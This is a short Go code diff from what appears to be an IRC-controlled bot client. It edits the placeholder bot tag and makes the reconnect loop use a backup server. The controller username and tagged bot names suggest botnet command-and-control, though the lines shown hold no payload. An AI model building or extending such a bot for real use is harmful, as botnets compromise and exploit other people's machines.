@@ -16,7 +16,7 @@ const (
 	IRC_CHANNEL       = "" //Config channel here. //"#Example"
 	IRC_CHANNEL_KEY   = "" //Config channel key here, if you didn't have it just leave it blank.
 	IRC_USERNAME      = "" //Config your IRC username here, for access to your bot commands.
-	IRC_BOT_TAG       = "" //Config your bot tag. //"FATE" //[FATE][A][1234567]
+	IRC_BOT_TAG       = "" //Config your bot tag here. //"EXAMPLE" //[EXAMPLE][A][1234567]
 )
 
 func run(server string) error {
@@ -73,7 +73,7 @@ func main() {
 			lib.Kill()
 		}
 		for {
-			if run(IRC_SERVER) == nil {
+			if run(IRC_BACKUP_SERVER) == nil {
 				break
 			}
 		}
